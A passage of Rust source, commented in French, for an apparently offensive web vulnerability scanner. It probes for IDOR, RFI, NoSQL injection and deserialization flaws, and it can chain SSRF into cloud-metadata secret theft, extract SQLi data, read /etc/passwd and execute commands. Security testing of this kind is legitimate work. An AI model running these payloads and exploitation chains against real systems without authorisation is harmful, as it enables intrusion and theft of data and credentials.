    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(candidates)
        .map(|param| {
            let authed = build_client(cfg);
            let anon   = build_client_no_auth(cfg);
            async move {
                let mut vulns = Vec::new();
                for value in ["1", "2"] {
                    let test_url = format!("{}?{}={}", base_url, param, value);
                    let Some((sa, ba, _)) = http_get(&authed, &test_url, cfg.retries).await else { continue };
                    let Some((sn, bn, _)) = http_get(&anon,   &test_url, cfg.retries).await else { continue };

                    // Les deux sessions obtiennent la MÊME ressource servie ⇒
                    // l'autorisation n'est pas vérifiée côté serveur.
                    if sa == 200 && sn == 200 && ba.len() > 200 && !looks_like_login(&ba) {
                        let sim = body_similarity(&ba, &bn);
                        if sim >= 0.85 {
                            println!("  \x1b[38;5;196m[IDOR]\x1b[0m {} param={} valeur={} (identique sans session)", base_url, param, value);
                            vulns.push(WebVuln {
                                vuln_type:   "IDOR / Contrôle d'accès manquant".into(),
                                url:         test_url,
                                parameter:   param.clone(),
                                payload:     value.to_string(),
                                evidence:    format!(
                                    "`{}={}` servi à l'identique (similarité {:.0} %) SANS session authentifiée",
                                    param, value, sim * 100.0
                                ),
                                severity:    "HIGH".into(),
                                confidence:  0.8,
                                remediation: "Vérifier l'autorisation par objet côté serveur (l'objet appartient-il au sujet authentifié ?), pas seulement l'authentification.".into(),
                            });
                            break;
                        }
                    }
                }
                vulns
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

// ─────────────────────────────────────────────────────────────────────────────
// 8quinquies. RFI — inclusion de fichier distant
// ─────────────────────────────────────────────────────────────────────────────

/// RFI. Détection volontairement conservatrice : sans contenu contrôlé hébergé
/// sur notre domaine, le seul signal déterministe est un message d'erreur qui
/// trahit une TENTATIVE d'ouverture de NOTRE URL sonde. Un reflet quelconque ne
/// suffit pas — on exige la co-occurrence de l'URL et d'un message d'inclusion.
pub async fn scan_rfi(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    // OPSEC : domaine réservé IANA (RFC 2606) — jamais de domaine réel.
    const PROBE: &str = "http://example.org/nrtg_rfi_probe.txt";
    const MARKERS: &[&str] = &[
        "failed to open stream",
        "allow_url_include",
        "url file-access is disabled",
        "allow_url_fopen",
        "http:// wrapper is disabled",
        "failed to open stream: http request failed",
    ];

    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move {
                let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(PROBE));
                let Some((status, body, _)) = http_get(&client, &test_url, cfg.retries).await
                else { return Vec::new() };

                let l = body.to_ascii_lowercase();
                if l.contains("example.org") && MARKERS.iter().any(|m| l.contains(m)) {
                    println!("  \x1b[38;5;196m[RFI]\x1b[0m {} param={}", base_url, param);
                    return vec![WebVuln {
                        vuln_type:   "RFI — Inclusion de fichier distant (à confirmer)".into(),
                        url:         test_url,
                        parameter:   param,
                        payload:     PROBE.to_string(),
                        evidence:    format!("La réponse mentionne l'URL sonde dans un contexte d'inclusion distante (HTTP {})", status),
                        severity:    "HIGH".into(),
                        confidence:  0.6,
                        remediation: "Désactiver `allow_url_include`/`allow_url_fopen` et ne jamais transmettre une URL utilisateur à un `include`/`require`.".into(),
                    }];
                }
                Vec::new()
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

// ─────────────────────────────────────────────────────────────────────────────
// 8sexies. NoSQL injection
// ─────────────────────────────────────────────────────────────────────────────

/// Marqueurs d'erreur propres aux moteurs NoSQL (MongoDB en tête). Des chaînes
/// trop génériques (« mongo » seul, « error ») sont volontairement exclues :
/// seul un message reconnaissable déclenche, et uniquement en DIFFÉRENTIEL
/// avec la réponse nominale.
const NOSQL_ERROR_MARKERS: &[&str] = &[
    "mongoerror",
    "casterror",
    "bsontypeerror",
    "cannot apply $",
    "unknown operator $",
    "unrecognized field",
    "operator $",
    "invalid operator $",
    "still open",
    "cannot convert",
];

/// NoSQL injection (opérateurs `$ne`/`$gt`/`$regex`/`$where`). Détection
/// error-based en différentiel : le marqueur doit apparaître sur la requête
/// injectée ET être absent de la réponse nominale.
pub async fn scan_nosql(base_url: &str, params: &[&str], cfg: &WebAttackConfig) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move {
                let Some((_, base_body, _)) = http_get(&client, base_url, cfg.retries).await
                else { return Vec::new() };
                let base_l = base_body.to_ascii_lowercase();

                let mut vulns = Vec::new();
                for op in ["[$ne]", "[$gt]", "[$regex]", "[$where]"] {
                    let test_url = format!("{}?{}{}=1", base_url, param, op);
                    let Some((status, body, _)) = http_get(&client, &test_url, cfg.retries).await
                    else { continue };
                    let l = body.to_ascii_lowercase();

                    let hit = NOSQL_ERROR_MARKERS.iter().any(|m| l.contains(m));
                    let clean_base = !NOSQL_ERROR_MARKERS.iter().any(|m| base_l.contains(m));
                    if hit && clean_base {
                        println!("  \x1b[38;5;196m[NOSQL]\x1b[0m {} param={} op={}", base_url, param, op);
                        vulns.push(WebVuln {
                            vuln_type:   "NoSQL Injection".into(),
                            url:         test_url,
                            parameter:   param.clone(),
                            payload:     format!("{}{}=1", param, op),
                            evidence:    format!("Erreur moteur NoSQL déclenchée par l'opérateur `{}` (HTTP {})", op, status),
                            severity:    "HIGH".into(),
                            confidence:  0.7,
                            remediation: "Caster et valider les entrées (jamais de type utilisateur brut dans une requête) ; rejeter les clés commençant par `$` (mongo-sanitize / whitelist).".into(),
                        });
                        break;
                    }
                }
                vulns
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    dedup_vulns(groups.into_iter().flatten().collect())
}

// ─────────────────────────────────────────────────────────────────────────────
// 8septies. Désérialisation non sécurisée
// ─────────────────────────────────────────────────────────────────────────────

/// Reconnaît un objet sérialisé natif dans une chaîne (cookie, paramètre,
/// corps). Retourne le format détecté le cas échéant.
fn serialized_format(s: &str) -> Option<&'static str> {
    let t = s.trim();
    if t.contains("rO0AB") {
        return Some("Java (ObjectInputStream, rO0AB)");
    }
    if t.contains("AAEAAAD/////") {
        return Some(".NET BinaryFormatter");
    }
    if t.starts_with("O:") || t.starts_with("a:") {
        return Some("PHP serialize()");
    }
    if t.contains("gASV") || t.contains("gAJ9") {
        return Some("Python pickle");
    }
    if t.starts_with("\u{0004}\u{0008}") {
        return Some("Ruby Marshal");
    }
    None
}

/// Désérialisation non sécurisée. Deux angles, volontairement non intrusifs :
///  (a) présence d'un blob sérialisé natif exposé (cookie / corps) ;
///  (b) sonde error-based : injecter un objet sérialisé minimal et observer une
///      erreur de désérialisation propre au langage (preuve d'un
///      `unserialize`/`readObject` sur donnée utilisateur).
pub async fn scan_deserialization(
    base_url: &str,
    params: &[&str],
    cfg: &WebAttackConfig,
) -> Vec<WebVuln> {
    use futures::stream::StreamExt;

    let mut vulns: Vec<WebVuln> = Vec::new();
    let client = build_client(cfg);

    // (a) Blob sérialisé exposé dans les cookies de session.
    if let Some((_, hmap, body)) = http_get_headers(&client, base_url, &[], cfg.retries).await {
        for v in hmap.get_all("set-cookie") {
            if let Ok(s) = v.to_str() {
                if let Some(fmt) = serialized_format(s) {
                    println!(
                        "  \x1b[38;5;196m[DESERIALIZE]\x1b[0m {} cookie ({})",
                        base_url, fmt
                    );
                    vulns.push(WebVuln {
                        vuln_type:   "Désérialisation non sécurisée — objet exposé (cookie)".into(),
                        url:         base_url.to_string(),
                        parameter:   "Set-Cookie".into(),
                        payload:     "<<objet sérialisé natif masqué>>".into(),
                        evidence:    format!("Cookie de session contenant un objet sérialisé {} — confiance client sur donnée désérialisée", fmt),
                        severity:    "HIGH".into(),
                        confidence:  0.6,
                        remediation: "Ne jamais désérialiser de données contrôlées par le client ; préférer un format signé (JWT) et une liste blanche de classes.".into(),
                    });
                }
            }
        }
        if let Some(fmt) = serialized_format(&body) {
            println!(
                "  \x1b[38;5;196m[DESERIALIZE]\x1b[0m {} corps ({})",
                base_url, fmt
            );
            vulns.push(WebVuln {
                vuln_type:   "Désérialisation non sécurisée — objet exposé (corps)".into(),
                url:         base_url.to_string(),
                parameter:   "response-body".into(),
                payload:     "<<objet sérialisé natif masqué>>".into(),
                evidence:    format!("Corps de réponse contenant un objet sérialisé {} — à confirmer (peut être légitime)", fmt),
                severity:    "MEDIUM".into(),
                confidence:  0.45,
                remediation: "Éviter d'exposer des blobs sérialisés natifs ; si nécessaire, signer et filtrer les classes autorisées.".into(),
            });
        }
    }

    if params.is_empty() {
        return dedup_vulns(vulns);
    }

    // (b) Sonde error-based.
    const PHP_OBJ: &str = "O:8:\"stdClass\":1:{}";
    const ERR_MARKERS: &[&str] = &[
        "unserialize()",
        "unserialize(): error",
        "notice: unserialize",
        "java.io.",
        "classnotfoundexception",
        "invalidclassexception",
        "streamcorruptedexception",
        "pickle",
        "unpicklingerror",
        "marshal.load",
    ];

    let groups: Vec<Vec<WebVuln>> = futures::stream::iter(params.iter().map(|p| p.to_string()))
        .map(|param| {
            let client = build_client(cfg);
            async move {
                let Some((_, base_body, _)) = http_get(&client, base_url, cfg.retries).await
                else { return Vec::new() };
                let base_l = base_body.to_ascii_lowercase();

                let test_url = format!("{}?{}={}", base_url, param, urlencoding::encode(PHP_OBJ));
                let Some((status, body, _)) = http_get(&client, &test_url, cfg.retries).await
                else { return Vec::new() };
                let l = body.to_ascii_lowercase();

                let hit = ERR_MARKERS.iter().any(|m| l.contains(m));
                let clean_base = !ERR_MARKERS.iter().any(|m| base_l.contains(m));
                if hit && clean_base {
                    println!("  \x1b[38;5;196m[DESERIALIZE]\x1b[0m {} param={} (erreur de désérialisation)", base_url, param);
                    return vec![WebVuln {
                        vuln_type:   "Désérialisation non sécurisée — erreur déclenchée".into(),
                        url:         test_url,
                        parameter:   param,
                        payload:     PHP_OBJ.to_string(),
                        evidence:    format!("Le serveur désérialise une entrée utilisateur (erreur native révélée, HTTP {})", status),
                        severity:    "CRITICAL".into(),
                        confidence:  0.75,
                        remediation: "Ne jamais désérialiser d'entrée non fiable ; utiliser un format de données inerte (JSON) et une liste blanche de types.".into(),
                    }];
                }
                Vec::new()
            }
        })
        .buffer_unordered(effective_concurrency(cfg))
        .collect()
        .await;

    vulns.extend(groups.into_iter().flatten());
    dedup_vulns(vulns)
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. Scan web complet
// ─────────────────────────────────────────────────────────────────────────────

pub async fn full_web_scan(base_url: &str, cfg: &WebAttackConfig) -> WebScanReport {
    let normalized = normalize_web_target(base_url, cfg).await;
    let base_url = normalized.as_str();

    println!(
        "\n  \x1b[38;5;196m[WEB-SCAN]\x1b[0m Scan d'injection sur \x1b[33m{}\x1b[0m",
        base_url
    );

    let mut report = WebScanReport {
        target: base_url.to_string(),
        ..Default::default()
    };

    // 1. Découverte de surface (chantier 1c).
    //    - `spider` : crawl multi-pages ⇒ paramètres, formulaires, endpoints et
    //      pages de vérification pour le stored XSS ;
    //    - sinon : repli sur l'extraction de paramètres de la page d'accueil.
    // (page, paramètres de la page) — pages où injecter pour le stored XSS.
    let mut spider_inject_pages: Vec<(String, Vec<String>)> = Vec::new();
    // Toutes les pages crawlées servent de pages de vérification.
    let mut spider_pages: Vec<String> = Vec::new();

    let params: Vec<String> = if cfg.spider {
        let mut sp = crate::web_spider::WebSpider::new(
            base_url,
            cfg.max_pages,
            cfg.max_depth,
            effective_concurrency(cfg),
            cfg.timeout,
            &cfg.auth,
            &cfg.proxies,
            Vec::new(),
        );
        let res = sp.crawl(base_url).await;

        spider_pages = res.pages.iter().map(|p| p.url.clone()).collect();
        report.forms = res
            .forms
            .iter()
            .map(|f| HtmlForm {
                action: f.action.clone(),
                method: f.method.clone(),
                inputs: f.inputs.iter().map(|i| i.name.clone()).collect(),
            })
            .collect();
        report.endpoints = res.endpoints.iter().map(|e| e.url.clone()).collect();

        let mut found: Vec<String> = Vec::new();
        for page in &res.pages {
            if !page.params.is_empty() {
                spider_inject_pages.push((page.url.clone(), page.params.clone()));
            }
            found.extend(page.params.iter().cloned());
        }
        for form in &res.forms {
            for input in &form.inputs {
                if input.injectable {
                    found.push(input.name.clone());
                }
            }
        }
        found.sort();
        found.dedup();
        println!(
            "  → spider: {} page(s), {} formulaire(s), {} endpoint(s), {} paramètre(s)",
            res.pages.len(),
            res.forms.len(),
            res.endpoints.len(),
            found.len()
        );
        found
    } else {
        discover_params(base_url, cfg).await
    };

    let param_strs: Vec<&str> = params.iter().map(|s| s.as_str()).collect();
    report.pages_tested = if cfg.spider {
        spider_pages.len().max(1)
    } else {
        param_strs.len().max(1)
    };

    if !param_strs.is_empty() {
        let preview: Vec<_> = param_strs.iter().take(8).copied().collect();
        println!(
            "  → {} paramètre(s) découvert(s): {:?}",
            param_strs.len(),
            &preview
        );
    } else {
        println!("  → {} paramètre(s) découvert(s): []", param_strs.len());
    }

    // Gating d'applicabilité déterministe (règle OPSEC du projet : « pas de
    // SQLi sans paramètre »). Les scanners d'injection exigent un point
    // d'injection réel. Sans aucun paramètre découvert — ni query string ni
    // champ de formulaire via le spider — la surface est inapplicable : on ne
    // fabrique pas des dizaines de noms synthétiques pour « tester quand même »,
    // ce qui produirait du bruit et des conclusions infondées.
    let has_param_surface = !param_strs.is_empty();

    // Paramètres par défaut, utilisés uniquement pour ENRICHIR une surface déjà
    // prouvée (génériques + CMS + LFI + injection de commande).
    let default_params = [
        "id",
        "page",
        "url",
        "file",
        "path",
        "q",
        "search",
        "user",
        "username",
        "email",
        "redirect",
        "next",
        "cmd",
        "exec",
        "lang",
        "include",
        "load",
        "read",
        "template",
        "name",
        "query",
        "input",
        "p",
        "cat",
        "s",
        "post_id",
        "attachment_id",
        "tag",
        "author",
        "option",
        "view",
        "Itemid",
        "task",
        "tmpl",
        "format",
        "q",
        "page",
        "v",
        "itok",
        "delta",
        "family",
        "scope",
        "keys",
        "pb",
        "f",
        "generator",
        "viewport",
        "handheldfriendly",
        "mobileoptimized",
        "content",
        "doc",
        "document",
        "download",
        "img",
        "image",
        "style",
        "theme",
        "skin",
        "filter",
        "sort",
        "order",
        "dir",
        "limit",
        "offset",
        "start",
        "go",
        "action",
    ];
    let dp_vec: Vec<&str> = default_params
        .iter()
        .copied()
        .chain(cfg.external.params.iter().map(|s| s.as_str()))
        .collect();
    let test_params: Vec<&str> = if !has_param_surface {
        Vec::new()
    } else {
        param_strs
            .iter()
            .copied()
            .chain(dp_vec.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect()
    };

    if !has_param_surface {
        println!(
            "  \x1b[33m[GATE]\x1b[0m aucun paramètre découvert — scanners d'injection \
             (SQLi, XSS, SSTI, SSRF, LFI, CMDi) ignorés : aucune surface applicable"
        );
    }

    // 2. Tests d'injection — orchestration déterministe (chantier 1b).
    // Chaque scanner est piloté par son flag de config : le périmètre testé est
    // explicite et reproductible, sans dispatch par mots-clés côté agent.
    if has_param_surface && cfg.test_sqli {
        print!("  → SQLi... ");
        let vulns = scan_sqli(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_blind_sqli {
        print!("  → SQLi blind (boolean)... ");
        let vulns = scan_sqli_boolean_blind(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_xss {
        print!("  → XSS... ");
        let vulns = scan_xss(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_ssti {
        print!("  → SSTI... ");
        let vulns = scan_ssti(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // Stored XSS — la charge injectée est recherchée sur les AUTRES pages
    // crawlées : sans le spider, il n'existe aucune page de vérification.
    if cfg.test_xss && cfg.spider && !spider_inject_pages.is_empty() {
        print!("  → Stored XSS... ");
        let verify: Vec<&str> = spider_pages.iter().map(|s| s.as_str()).collect();
        let mut stored: Vec<WebVuln> = Vec::new();
        for (page_url, page_params) in &spider_inject_pages {
            let pp: Vec<&str> = page_params.iter().map(|s| s.as_str()).collect();
            stored.extend(crate::web_spider::test_stored_xss(page_url, &pp, &verify).await);
        }
        let stored = dedup_vulns(stored);
        println!(
            "{}",
            if stored.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(stored);
    }

    if has_param_surface && cfg.test_ssrf {
        print!("  → SSRF... ");
        let vulns = scan_ssrf(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_traversal {
        print!("  → Path Traversal/LFI... ");
        let traversal_params = [
            "file", "path", "page", "include", "load", "read", "template",
        ];
        let tp: Vec<&str> = test_params
            .iter()
            .filter(|p| traversal_params.contains(p))
            .cloned()
            .chain(traversal_params.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        let vulns = scan_path_traversal(base_url, &tp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if cfg.test_xxe {
        print!("  → XXE... ");
        let vulns = scan_xxe(base_url, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_cmd_inject {
        print!("  → Command Injection... ");
        let cmd_params = ["cmd", "exec", "command", "ping", "host", "ip", "url"];
        let cp: Vec<&str> = test_params
            .iter()
            .filter(|p| cmd_params.contains(p))
            .cloned()
            .chain(cmd_params.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        let vulns = scan_cmd_injection(base_url, &cp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if cfg.test_cors {
        print!("  → CORS misconfig... ");
        let vulns = scan_cors(base_url, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if cfg.test_graphql {
        print!("  → GraphQL... ");
        let vulns = scan_graphql(base_url, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if cfg.test_oauth2 {
        print!("  → OAuth2... ");
        let vulns = scan_oauth2(base_url, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // Smuggling : volontairement lent (timeouts) et de confiance faible ⇒
    // uniquement si explicitement activé.
    if cfg.test_smuggling {
        print!("  → HTTP Smuggling (lent)... ");
        let vulns = scan_http_smuggling(base_url, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // Open redirect
    if cfg.test_open_redirect {
        print!("  → Open Redirect... ");
        let redirect_params = [
            "url", "redirect", "next", "return", "goto", "dest", "target", "redir", "link",
            "callback",
        ];
        let rp: Vec<&str> = test_params
            .iter()
            .filter(|p| redirect_params.contains(p))
            .cloned()
            .chain(redirect_params.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        let vulns = scan_open_redirect(base_url, &rp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // CRLF injection — les paramètres de redirection/URL sont la surface
    // classique (insertion dans `Location` ou `Set-Cookie`).
    if has_param_surface && cfg.test_crlf {
        print!("  → CRLF injection... ");
        let crlf_params = [
            "url", "redirect", "next", "return", "goto", "dest", "target", "lang", "page", "q",
        ];
        let cp: Vec<&str> = test_params
            .iter()
            .filter(|p| crlf_params.contains(p))
            .cloned()
            .chain(crlf_params.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        let vulns = scan_crlf(base_url, &cp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // CSRF — analyse des formulaires mutateurs découverts par le spider.
    if cfg.test_csrf && !report.forms.is_empty() {
        print!("  → CSRF... ");
        let vulns = scan_csrf(base_url, &report.forms, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;214m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // IDOR — nécessite un contexte d'authentification pour le différentiel.
    if has_param_surface && cfg.test_idor {
        if cfg.auth.is_empty() {
            println!("  \x1b[33m[GATE]\x1b[0m IDOR ignoré — aucun contexte d'auth (--cookie/--bearer) : différentiel impossible");
        } else {
            print!("  → IDOR (différentiel auth/anon)... ");
            let vulns = scan_idor(base_url, &test_params, cfg).await;
            println!(
                "{}",
                if vulns.is_empty() {
                    "\x1b[90maucune\x1b[0m"
                } else {
                    "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
                }
            );
            report.vulns.extend(vulns);
        }
    }

    if has_param_surface && cfg.test_rfi {
        print!("  → RFI... ");
        let rfi_params = [
            "file", "path", "page", "include", "load", "read", "template", "doc", "document",
            "url", "src",
        ];
        let rp: Vec<&str> = test_params
            .iter()
            .filter(|p| rfi_params.contains(p))
            .cloned()
            .chain(rfi_params.iter().copied())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        let vulns = scan_rfi(base_url, &rp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if has_param_surface && cfg.test_nosql {
        print!("  → NoSQL injection... ");
        let vulns = scan_nosql(base_url, &test_params, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    if cfg.test_deserialize {
        print!("  → Désérialisation... ");
        let dp: Vec<&str> = if has_param_surface {
            test_params.clone()
        } else {
            Vec::new()
        };
        let vulns = scan_deserialization(base_url, &dp, cfg).await;
        println!(
            "{}",
            if vulns.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ TROUVÉE\x1b[0m"
            }
        );
        report.vulns.extend(vulns);
    }

    // 3. Chaînage d'exploitation (chantier 3a).
    // Un SSRF confirmé en lecture directe est immédiatement exploité pour lire
    // les métadonnées d'instance ; les secrets extraits sont versés au rapport.
    // Les SSRF aveugles (et les injections POST) sont exclus : sans lecture de
    // la réponse, il n'y a rien à chaîner.
    let ssrf_params: Vec<String> = report
        .vulns
        .iter()
        .filter(|v| v.vuln_type.contains("SSRF") && !v.vuln_type.contains("aveugle"))
        .map(|v| v.parameter.clone())
        .filter(|p| !p.starts_with("POST:"))
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    if !ssrf_params.is_empty() {
        print!(
            "  → Chaînage SSRF→IMDS ({} paramètre(s))... ",
            ssrf_params.len()
        );
        for param in &ssrf_params {
            report
                .secrets
                .extend(chain_ssrf_metadata(base_url, param, cfg).await);
        }
        let mut seen = std::collections::HashSet::new();
        report
            .secrets
            .retain(|s| seen.insert((s.kind.clone(), s.value.clone())));
        println!(
            "{}",
            if report.secrets.is_empty() {
                "\x1b[90maucun secret\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ SECRETS EXTRAITS\x1b[0m"
            }
        );
    }

    // 4. Extraction de données post-exploitation (opt-in : lente et agressive).
    //    - SQLi aveugle sur chaque paramètre découvert ;
    //    - démonstration LFI/CMDi bornée au premier paramètre.
    if cfg.extract_data {
        print!(
            "  → Extraction SQLi ({} paramètre(s))... ",
            test_params.len()
        );
        for param in test_params.iter().copied() {
            if let Some(ext) = extract_sqli_data(base_url, param, cfg).await {
                let has_data = ext.current_db.is_some()
                    || !ext.databases.is_empty()
                    || !ext.tables.is_empty()
                    || !ext.rows.is_empty();
                if has_data {
                    let evidence = format!(
                        "db={:?} databases={:?} tables={:?} colonnes={} lignes={} (valeurs sensibles masquées)",
                        ext.current_db, ext.databases, ext.tables, ext.columns.len(), ext.rows.len()
                    );
                    println!(
                        "\n  \x1b[38;5;196m[SQLi EXTRACT HIT]\x1b[0m {} param={}",
                        base_url, param
                    );
                    report.vulns.push(WebVuln {
                        vuln_type:   "SQL Injection — Extraction de données".into(),
                        url:         base_url.to_string(),
                        parameter:   param.to_string(),
                        payload:     format!("injection={} dbms={:?}", ext.injection, ext.dbms),
                        evidence,
                        severity:    "HIGH".into(),
                        confidence:  0.85,
                        remediation: "Utiliser des requêtes préparées et restreindre les privilèges du compte SQL.".into(),
                    });
                    report.extractions.push(ext);
                }
            }
        }
        println!(
            "{}",
            if report.extractions.is_empty() {
                "\x1b[90maucune\x1b[0m"
            } else {
                "\x1b[38;5;196m⚠️ DONNÉES EXTRAITES\x1b[0m"
            }
        );

        // Démonstration LFI/CMDi : premier paramètre uniquement (1 fichier, 1 commande).
        if let Some(first) = test_params.first().copied() {
            if let Some(content) = read_lfi_file(base_url, first, "/etc/passwd", cfg).await {
                println!(
                    "\n  \x1b[38;5;196m[LFI-READ]\x1b[0m {} param={} (/etc/passwd)",
                    base_url, first
                );
                report.vulns.push(WebVuln {
                    vuln_type: "LFI — Lecture de fichier".into(),
                    url: base_url.to_string(),
                    parameter: first.to_string(),
                    payload: "php://filter/convert.base64-encode/resource=/etc/passwd".into(),
                    evidence: format!(
                        "Fichier lu ({} octets, contenu non journalisé)",
                        content.len()
                    ),
                    severity: "HIGH".into(),
                    confidence: 0.80,
                    remediation:
                        "Valider les chemins ; interdire les wrappers php:// et la traversée."
                            .into(),
                });
            }
            if let Some(out) = exec_cmdi_command(base_url, first, "id", cfg).await {
                println!(
                    "\n  \x1b[38;5;196m[CMDi-EXEC]\x1b[0m {} param={} (id)",
                    base_url, first
                );
                report.vulns.push(WebVuln {
                    vuln_type:   "Command Injection — Exécution".into(),
                    url:         base_url.to_string(),
                    parameter:   first.to_string(),
                    payload:     "; echo <marqueur>; id; echo <marqueur>".into(),
                    evidence:    format!("Commande `id` exécutée ({} ligne(s), sortie non journalisée)", out.lines().count()),
                    severity:    "CRITICAL".into(),
                    confidence:  0.80,
                    remediation: "Ne jamais passer d'entrée utilisateur à un shell ; utiliser des APIs natives.".into(),
                });
            }
        }
    }

    let crit = report
        .vulns
        .iter()
        .filter(|v| v.severity == "CRITICAL")
        .count();
    let high = report.vulns.iter().filter(|v| v.severity == "HIGH").count();
    println!(
        "\n  \x1b[36m[WEB-SCAN]\x1b[0m Terminé — {} vuln(s) : {} CRITICAL, {} HIGH, {} secret(s)",
        report.vulns.len(),
        crit,
        high,
        report.secrets.len()
    );

    report
}

/// Normalise une URL cible de scan web :
/// 1. Ajoute https:// par défaut si schéma absent
/// 2. Probe automatiquement 4 variantes (http/https × www/no-www)
/// 3. Retourne l'URL qui répond le mieux (status 2xx + body non vide + HTML si possible)
/// 4. Supprime le préfixe www redondant si domaine racine répond aussi
pub async fn normalize_web_target(raw: &str, cfg: &WebAttackConfig) -> String {
    let raw_trim = raw.trim_end_matches('/').to_string();
    // Conserver le schéma explicite de l'URL fournie : le forcer à https fait
    // perdre l'intention de l'appelant (ex. un endpoint HTTP en clair).
    let (raw_scheme, domain_only) = if let Some(rest) = raw_trim.strip_prefix("https://") {
        ("https", rest.to_string())
    } else if let Some(rest) = raw_trim.strip_prefix("http://") {
        ("http", rest.to_string())
    } else {
        ("https", raw_trim.clone())
    };

    // L'URL d'origine (schéma + port explicites, ex. `http://h:80`) est
    // candidate en priorité : elle ne doit jamais être écartée au profit d'un
